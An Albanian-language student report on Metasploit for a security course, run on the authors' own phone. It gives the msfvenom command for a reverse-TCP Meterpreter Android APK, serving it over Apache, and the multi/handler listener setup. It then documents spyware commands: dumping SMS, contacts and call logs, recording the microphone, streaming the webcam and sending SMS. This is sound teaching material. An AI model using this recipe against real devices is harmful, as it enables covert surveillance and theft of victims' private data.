---
title: Analiza e veglës Metasploit
---

# Analiza e veglës Metasploit

| [Fatbardh Kadriu](https://github.com/FatbardhKadriu) | [Arbena Musa](https://github.com/ArbenaMusa) | [Albana Hysenaj](https://github.com/albanah) |
| ---------------------------------------------------- | -------------------------------------------- | -------------------------------------------- |
|                                                      |                                              |                                              |

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ky punim është kryer në kuadër të detyrës së dytë në lëndën "Siguria e Informacionit" dhe shembujt e testuar janë përdorur vetëm për qëllime edukative. Zhvillimi i shembujve të tillë pa dijeninë dhe miratimin e personave të përfshirë si target konsiderohet jolegale.

#### Përmbajtja

* [Teknologjitë dhe pajisjet e përdorura](#teknologjitë-dhe-pajisjet-e-përdorura)
* [Çfarë është Metasploit](#çfarë-është-metasploit)
* [Shembujt e testuar](#shembujt-e-testuar)
    + [Exploit](#exploit)
    + [Payload](#payload)
    + [Krijimi i android aplikacionit të infektuar](#krijimi-i-android-aplikacionit-të-infektuar)
    + [Kalimi i aplikacionit të infektuar tek sistemi i targetuar](#kalimi-i-aplikacionit-të-infektuar-tek-sistemi-i-targetuar)
    + [Shfrytëzimi i sistemit të targetuar](#shfrytëzimi-i-sistemit-të-targetuar)
* [Komandat e Meterpreter](#komandat-e-meterpreter)
    + [Komandat kryesore](#komandat-kryesore)
      - [background dhe bg](#background-dhe-bg)
    + [Komandat e sistemit të fajllave](#komandat-e-sistemit-të-fajllave)
      - [cd dhe lcd](#cd-dhe-lcd)
      - [ls dhe lls](#ls-dhe-lls)
      - [pwd dhe lpwd](#pwd-dhe-lpwd)
      - [search](#search)
    + [Komandat e rrjetit](#komandat-e-rrjetit)
      - [ifconfig dhe ipconfig](#ifconfig-dhe-ipconfig)
    + [Komandat e sistemit](#komandat-e-sistemit)
      - [getuid](#getuid)
      - [localtime](#localtime)
      - [shell](#shell)
      - [sysinfo](#sysinfo)
    + [Komandat e kamerës](#komandat-e-kamerës)
      - [record_mic](#record_mic)
      - [webcam_list](#webcam_list)
      - [webcam_snap](#webcam_snap)
      - [webcam_stream](#webcam_stream)
    + [Komandat e androidit](#komandat-e-androidit)
      - [check_root](#check_root)
      - [dump_calllog](#dump_calllog)
      - [dump_contacts](#dump_contacts)
      - [dump_sms](#dump_sms)
      - [send_sms](#send_sms)
      - [set_audio_mode](#set_audio_mode)
    + [Komandat për kontrollimin e aplikacioneve](#komandat-për-kontrollimin-e-aplikacioneve)
      - [app_list](#app_list)
      - [app_run](#app_run)
      - [app_unisntall](#app_unisntall)


## Teknologjitë dhe pajisjet e përdorura

* Pajisja kompjuterike (sistemi sulmues) - sistemi operativ Kali Linux.
* Pajisja mobile (sistemi i targetuar) - sistemi operativ Android, versioni 10.
* Metasploit Framework dhe MSFVenom.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Për shkak që në shembullin e zhvilluar sistemi sulmues dhe sistemi i targetuar duhet të jenë të kyçur në të njëjtin rrjet (të jenë në të njëjtin LAN) dhe përdoren IP-të private të tyre, nuk ka qenë i mundur përdorimi i makinave virtuale apo emulatorëve dhe janë përdorur pajisjet tona fizike duke mos cënuar pajisjet e personave të tjerë.

## Çfarë është Metasploit

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Metasploit është vegël (tool) e cila përdoret për hetimin e dobësive sistematike në rrjet dhe në servera nga hakerët etikë. Gjetja e dobësive përmes kësaj vegle zhvillohet lehtësisht në shumicën e sistemeve operative, pasi një numër i madh i tyre përkrahen. Përdorimi i Metasploit nënkupton përdorimin e një kodi të gatshëm ose të personalizuar dhe futjen e tij në rrjet për të gjetur dobësitë ekzistuese.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Gjatë zhvillimit të shembujve tonë ne kemi përdorur konsolën MSFconsole duke dhënë komanda direkte për sistemin. Msfconsole mund të shfrytëzohet për të bërë gjithçka, duke përfshirë nisjen e një exploit, ngarkimin e moduleve ndihmëse, kryerjen e regjistrimit, krijimin e dëgjuesve, etj.

## Shembujt e testuar

### Exploit

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exploit (shfrytëzim, përdorim) ekzekuton një sekuencë të komandave për të targetuar një dobësi specifike që është gjetur në një sistem ose aplikacion. Ky modul përfiton nga dobësia për të fituar çasje në sistemin e targetuar.
Hapi i parë është kërkimi për exploit adekuat për platformën android dhe përzgjedhja e tij në mesin e shumë mundësive që ofrohen.

```
msf6 > search type:exploit platform:android

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   ........................................................................................................................
   10  exploit/multi/handler                                                      manual     No     Generic Payload Handler
   ........................................................................................................................
```

| Karakteristika  | Shpjegimi                                                                                                                                                                   |
| --------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Name            | Emri i modulit.                                                                                                                                                             |
| Disclosure Date | Data e zbulimit.                                                                                                                                                            |
| Rank            | Tregon se sa është exploit i besueshëm dhe se sa janë gjasat që të ketë ndikim negativ tek sistemi i targetuar. Exploits janë të renditura nga ai me rëndësinë më të madhe. |
| Check           | Kontrollon nëse sistemi i targetuar është i cenueshëm nga një shfrytëzim i veçantë, në vend që të shfrytëzohet  direkt.                                                    |
| Description     | Përfshin më shumë detaje në lidhje me cenueshmërinë e veçantë që moduli shfrytëzon.                                                                                         |

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Moduli i zgjedhur për exploit, `multi/handler` mundëson vendosjen e payloads (ngarkesave) të pavarura. Fajlli i infektuar që do të hapet nga ana e sistemit të targetuar do të vendos komunimin me sulmuesin. Është e nevojshme që të ekzistoj një kontrollues i cili do të pres për lidhjen e vendosur kur komunikimi drejtohet nga sistemi i kompromentuar te sulmuesi.

### Payload

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload (ngarkesa) është shell code që ekzekutohet pasi moduli exploit ta ketë kompromentuar një sistem. Na mundëson të lidhemi me sistemin e targetuar dhe ta përdorim atë si të tonën, pasi të kemi shfrytëzuar një cenueshmëri në sistemin e saj. Ajo na mundëson të definojmë se si duam të lidhemi me sistemin e targetuar dhe çfarë duam të bëjmë me të në vazhdim. Metasploit ka shumë lloje të payloads që mund të përdoren për sistemin e targetuar.

Për të parë payloads që janë në dispozicion dhe për të listuar ata adekuat për platformën android kërkojmë:

```
msf6 > search type:payload platform:android

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   .............................................................................................................................
   2  payload/android/meterpreter/reverse_tcp                     normal  No     Android Meterpreter, Android Reverse TCP Stager
   .............................................................................................................................
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload `android/meterpreter/reverse_tcp` përdoret për sistemin android. Meterpreter është shkurtesë për meta interpreter që është një payload i cili mundëson vendosjen e komunikimit mes sulmuesit dhe targetit si dhe shkëmbimin e të dhënave prej sistemit të kompromentuar tek sulmuesi përmes komandave që jepen nga sulmuesi në njërën anë të soketit. Reverse_tcp nënkupton që përdoret meterpreter si reverse shell që është një shell në të cilin sistemi i targetuar, komunikon përsëri mbrapsht me sistemin sulmues. Sistemi sulmues cakton një port për dëgjim në të cilin pret lidhjen me targetin dhe përmes përdorimit të të cilit realizohet ekzekutimi i komandave pasuese.

<center>
<img src="READMEresources/reverse_shell.png">
<figcaption><small><i>Fig. 1: Ilustrimi se si funksionon reverse shell</i></small></figcaption>
</center>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Android Meterpreter mundëson marrjen e informatave nga folderët e sistemit, përgjimin e thirrjeve telefonike, leximin dhe dërgimin e mesazheve, leximin e regjistrit të telefonatave, përdorimin e kamerave të sistemit, etj.

### Krijimi i android aplikacionit të infektuar

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Për të krijuar një APK (Android Package) fajll të infektuar përdorim `msfvenom` e cila është një instancë e Metasploit, funsionaliteti i së cilës kombinon krijimin dhe enkodimin e ngarkesave për përdorime të ndryshme. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Msfvenom përdoret për gjenerimin e ngarkesës sipas kërkesës dhe në varësi të disponueshmërisë së llojeve në Metasploit. Për të gjeneruar një `android/meterpreter/reverse_tcp` payload që do të instalohet në sistemin e targetuar, përmes msfvenom shkruajmë komandën:

```
$ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.12 LPORT=4444 R > /root/Desktop/OurApp.apk
```

| Shkurtesa                  | Shpjegimi                                                              |
| -------------------------- | ---------------------------------------------------------------------- |
| -p                         | Specifikon llojin e payload që përdoret.                               |
| LHOST IP                   | Adresa e sistemit e cila do të përdoret për të pritur lidhjen prapa.   |
| LPORT                      | Porti i sistemit që do të presë për komunikim me sistemin e targetuar. |
| R                          | Raw format (format i papërpunuar).                                     |
| /root/Desktop/OurApp.apk | Lokacioni ku ruhet APK aplikacioni i krijuar.                          |

<center>
<img width="100%" src="READMEresources/krijimi_i_apk_fajllit.gif"/>
<figcaption><small><i>Video 1: Krijimi i apk fajllit</i></small></figcaption>
</center>

### Kalimi i aplikacionit të infektuar tek sistemi targetuar

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Për shkak që shumica e platformave online e detektojnë një fajll i cili ka përmajtje kërcënuese për sigurinë, kalimin e fajllit të infektuar nga sulmuesi tek sistemi e targetuar e bëjmë përmes web serverit të apache në linux. Sulmuesi e vendos fajllin e infetuar në lokacionin `/var/www/html/` dhe sistemi i targetuar duke u çasur në browser në IP adresën e sulmuesit mund të gjej aplikacionin dhe ta instaloj. Komanda për ta startuar apache serverin është:

```
$ service apache2 start
// Komanda për të shikuar statusin e apache serverit
$ service apache2 status
```

<center>
<img width="30%" src="READMEresources/kalimi_i_aplikacionit.gif"/>
<figcaption><small><i><center>Video 2: Shkarkimi i aplikacionit dhe hapja e tij</center></i></small></figcaption>
</center>

### Shfrytëzimi i sistemit të targetuar

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Shembulli jonë e përdorë modulin `exploit/multi/handler` duke specifikuar payload, hostin i cili pret kthimin e lidhjes prapa dhe portin në të cilin dëgjohet lidhja. Komanda exploit fillon kërkimin e dobësive dhe në momentin që vendoset lidhja me aplikacionin e infektuar hapet meterpreter dhe nga aty e tutje mund të manipulohet sistemi i targetuar që tani e tutje mund ta quajmë si sistem i kompromentuar.

```
msf6 > use exploit/multi/handler

msf6 > set PAYLOAD android/meterpreter/reverse_tcp

msf6 > set LHOST 192.168.0.12

msf6 > set LPORT 4444

msf6 > exploit
```

<center>
<img width="100%" src="READMEresources/exploit.gif"/>
<figcaption><small><i>Video 3: Përdorimi i modulit <b>exploit</b></i></small></figcaption>
</center>

## Komandat e Meterpreter

### Komandat kryesore

```
Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background

```

#### background dhe bg

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Background e kalon lidhjen (sesionin) e krijuar nga payload me sistemin e kompromentuar aktual në prapavijë dhe mundëson që të ekzekutohen komanda të tjera në msfconsole. bg është shkurtesa për background. Për t'iu rikthyer një sesioni që është krijuar më herët në msfconsole ekzekutohen komandat si në vijim:

- `sessions` - shfaq listën e të gjithë sesioneve aktivë,
- `sessions -i <numri i session>` - e merr nga prapavija sesionin e caktuar në bazë të numrit të specifikuar dhe kalon në meterpreter shell për atë sesion.

<center>
<img width="100%" src="READMEresources/komandat_kryesore.gif"/>
<figcaption><small><i>Video 4: Përdorimi i komandës <b>background</b></i></small></figcaption>
</center>

### Komandat e sistemit të fajllave

```
Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cd            Change directory
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    pwd           Print working directory
    search        Search for files
```

#### cd dhe lcd

`cd` (change directory) mundëson navigimin në folderët e ruajtuar në sistemin e kompromentuar (kalimin nga një folder në tjetrin), ndërsa lcd mundëson navigimin në folderët e ruajtur në sistemin sulmues.

#### ls dhe lls

`ls` (list) liston të gjithë fajllat dhe folderët që ndodhen brenda folderit aktual tek sistemi i kompromentuar, ndërsa lls ka të njëjtin funksion tek sistemi sulmues.

#### pwd dhe lpwd

`pwd` (print working directory) tregon shtegun aktual në sistemin e kompromentuar, ndërsa lpwd tregon shtegun aktual në sistemin e sulmuesit.


<center>
<img width="100%" src="READMEresources/komandat_e_fajll_sistemit.gif"/>
<figcaption><small><i>Video 5: Përdorimi i komandave <b>cd</b>, <b>lcd</b>, <b>ls</b>, <b>lls</b>, <b>pwd</b> dhe <b>lpwd</b></i></small></figcaption>
</center>

#### search

`search` kërkon fajlla të caktuar në tërë memorien e sistemit të kompromentuar përderisa nuk ceket ndonjë pjesë specifike brenda folderëve.

- `-d` specifikon folderin në të cilin kërkohet,
- `-f` mostra (pattern) e cila kërkohet,
- `-r` kërkimi rekurziv nëpër folderët mbrenda folderit të cekur.

Meqë kërkimi i fajllave në tërë hapsirën memorike të sistemit të kompromentuar është i kushtueshëm në kohë dhe përdoruesi i saj mund ta vërejë mbingarkesën, sygjerohet që kur kërkohet të specifikohet një pjesë e caktuar e memories për të reduktuar kohën e kërkimit.

<center>
<img width="100%" src="READMEresources/komandat_e_fajll_sistemit2.gif"/>
<figcaption><small><i>Video 6: Përdorimi i komandës <b>search</b></i></small></figcaption>
</center>

### Komandat e rrjetit

```
Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    ifconfig      Display interfaces
    ipconfig      Display interfaces
```

#### ifconfig dhe ipconfig

`ifconfig` dhe `ipconfig` shfaqin ndërfaqen e rrjetit në të cilin është e kyçur sistemi sulmues dhe sistemi i kompromentuar.

<center>
<img width="100%" src="READMEresources/komandat_e_rrjetit.gif"/>
<figcaption><small><i>Video 7: Përdorimi i komandave <b>ifconfig</b> dhe <b>ipconfig</b></i></small></figcaption>
</center>

### Komandat e sistemit

```
Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    getuid        Get the user that the server is running as
    localtime     Displays the target system local date and time
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS
```

#### getuid

`getuid` tregon id e përdoruesit i cili është duke u përdorur në sistemin sulmues.

#### localtime

`localtime` tregon kohën lokale të sistemit të kompromentuar.

#### shell

`shell` hap një shell standard për sistemin e kompromentuar.

#### sysinfo

`sysinfo` shfaq të dhënat e sistemit duke përfshirë pikën e dëgjimit tek sulmuesi, sistemin operativ të sistemit të kompromentuar dhe llojin e meterpreter.

<center>
<img width="100%" src="READMEresources/komandat_e_sistemit.gif"/>
<figcaption><small><i>Video 8: Përdorimi i komandave <b>getuid</b>, <b>localtime</b>, <b>shell</b> dhe <b>sysinfo</b></i></small></figcaption>
</center>

### Komandat e kamerës

```
Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam
```

#### record_mic

`record_mic` inçizon zërin duke përdorur mikrofonin e sistemit të kompromentuar dhe duke e ruajtur në audio fajll me prapashtesën .wav, në sistemin sulmuese. Kjo komand mund të përdoret për përgjimin e zhurmave të ambientit në kohë reale.

- `-d` numri i sekondave sa zgjat inçizimi (paraprakisht është i caktuar si 1),
- `-f` lokacioni ku ruhet audio fajlli,
- `-p` luan automatikisht audio fajllin e inçizuar (si e parazgjedhur është true).

<center>
<img width="100%" src="READMEresources/komanda_record_mic.gif"/>
<figcaption><small><i>Video 9: Përdorimi i komandës <b>record_mic</b></i></small></figcaption>
</center>

#### webcam_list

`webcam_list` liston të gjitha kamerat që i posedon sistemi i kompromentuar dhe poashtu i identifikon ato me numra përkatës.

#### webcam_snap

`webcam_snap` shkrep një foto nga sistemi i kompromentuar, varësisht se cila kamerë e saj specifikohet.

- `-i` specifikon numrin identifikues të kamerës e cila përdoret.

<center>
<img width="100%" src="READMEresources/komanda_webcam.gif"/>
<figcaption><small><i>Video 10: Përdorimi i komandës <b>webcam_snap</b> duke specifikuar kamerën</i></small></figcaption>
</center>

#### webcam_stream

`webcam_stream` përdorë kamerën e sistemit të kompromentuar për të pasur qasje të vazhdueshme në kohë reale të pamjes nga kamera (live streaming).

- `-i` specifikon numrin identifikues të kamerës e cila përdoret.

<center>
<img width="100%" src="READMEresources/komanda_webcam_stream.gif"/>
<figcaption><small><i>Video 11: Përdorimi i komandës <b>webcam_stream</b> duke specifikuar kamerën</i></small></figcaption>
</center>
<br/>


### Komandat e androidit

```
Android Commands
================

    Command           Description
    -------           -----------
    check_root        Check if device is rooted
    dump_calllog      Get call log
    dump_contacts     Get contacts list
    dump_sms          Get sms messages
    send_sms          Sends SMS from target session
    set_audio_mode    Set Ringer Mode
```

#### check_root

`check_root` tregon se a është androidi rooted (procesi i lejimit të sistemeve që ekzekutohen në android mobile SO të kenë çasje të privilegjuar, e njohur si root access).

#### dump_calllog

`dump_calllog` nxjerr listën e të gjitha telefonatave të zhvilluara nga sistemi i kompromentuar dhe e ruan atë në një tekst fajll duke specifikuar detajet e secilës thirrje.


#### dump_contacts

`dump_contacts` nxjerr listën e të gjitha kontakteve të regjistruara në sistemin e kompromentuar dhe e ruan atë në një tekst fajll duke specifikuar detajet e secilit kontakt.

#### dump_sms

`dump_sms` nxjerr listë e sms-ëve të shkëmbyer nga sistemi i kompromentuar dhe e ruan atë në një tekst fajll duke specifikuar detajet e secilit sms.

<center>
<img width="100%" src="READMEresources/komandat_e_androidit.gif"/>
<figcaption><small><i>Video 12: Përdorimi i komandave <b>check_root</b>, <b>dump_calllog</b>, <b>dump_contacts</b> dhe <b>dump_sms</b></i></small></figcaption>
</center>

#### send_sms

`send_sms` dërgon sms nga sistemi i kompromentuar tek një destinacion i caktuar me tekstin që specifikohet.

- `-d` specifikon numrin telefonik tek i cili do të dërgohet mesazhi,
- `-t` specifikon përmbajtjen tekstuale të mesazhit që do të dërgohet.

<table width="100%">
<tr>
<td width="75%">
<center>
<img width="100%" src="READMEresources/mesazhi.gif"/>
</center>
</td>
<td width="25%">
<center>
<img width="100%" src="READMEresources/mesazhi2.gif"/>
</center>
</td>
</tr>
<tr>
<td><center><figcaption><small><i>Video 13: Përdorimi i komandës <b>send_sms</b></i></small></figcaption></center></td>
<td><figcaption><small><i>Video 14: Vëzhgimi i dërgimit të mesazhit në android</i></small></figcaption></td>
</tr>
</table>

#### set_audio_mode

`set_audio_mode` ndërron modin e audios së sistemit.

- `-m` specifikon modin në të cilin vendoset sistemi:

  - 0 - silent (pa zë),
  - 1 - normal,
  - 2 - high (me zë të lartë).

<table width="100%">
<tr>
<td width="75%">
<center>
<img width="100%" src="READMEresources/audio.gif"/>
</center>
</td>
<td width="25%">
<center>
<img width="100%" src="READMEresources/audio2.gif"/>
</center>
</td>
</tr>
<tr>
<td><center><figcaption><small><i>Video 15: Përdorimi i komandës <b>set_audio_mode</b></i></small></figcaption></center></td>
<td><figcaption><small><i>Video 16: Vëzhgimi i ndërrimit të audio modit në android</i></small></figcaption></td>
</tr>
</table>

### Komandat për kontrollimin e aplikacioneve

```
Application Controller Commands
===============================

    Command        Description
    -------        -----------
    app_list       List installed apps in the device
    app_run        Start Main Activty for package name
    app_uninstall  Request to uninstall application
```

#### app_list

`app_list` printon listën e të gjitha aplikacioneve të instaluara në sistemin e kompromentuar dhe të dhënat e tyre.

#### app_run

`app_run` hap një aplikacion të caktuar që është i instaluar tek sistemi i kompromentuar varësisht se cilin e zgjedhim.

<table width="100%">
<tr>
<td width="75%">
<center>
<img width="100%" src="READMEresources/komandat_e_aplikacioneve.gif"/>
</center>
</td>
<td width="25%">
<center>
<img width="100%" src="READMEresources/komandat_e_aplikacioneve1.gif"/>
</center>
</td>
</tr>
<tr>
<td><center><figcaption><small><i>Video 17: Përdorimi i komandës <b>app_list</b> dhe <b>app_run</b></i></small></figcaption></center></td>
<td><figcaption><small><i>Video 18: Vëzhgimi i hapjes së aplikacionit në android</i></small></figcaption></td>
</tr>
</table>

#### app_unisntall

`app_uninstall` shfaq dialogun për të fshirë një aplikacion të sistemit.


<table width="100%">
<tr>
<td width="75%">
<center>
<img width="100%" src="READMEresources/komandat_e_aplikacioneve2.gif"/>
</center>
</td>
<td width="25%">
<center>
<img width="100%" src="READMEresources/komandat_e_aplikacioneve3.gif"/>
</center>
</td>
</tr>
<tr>
<td><center><figcaption><small><i>Video 19: Përdorimi i komandës <b>app_uninstall</b></i></small></figcaption></center></td>
<td><figcaption><small><i>Video 20: Vëzhgimi i shfaqjes së kërkesës për fshirjen e aplikacionit në android</i></small></figcaption></td>
</tr>
</table>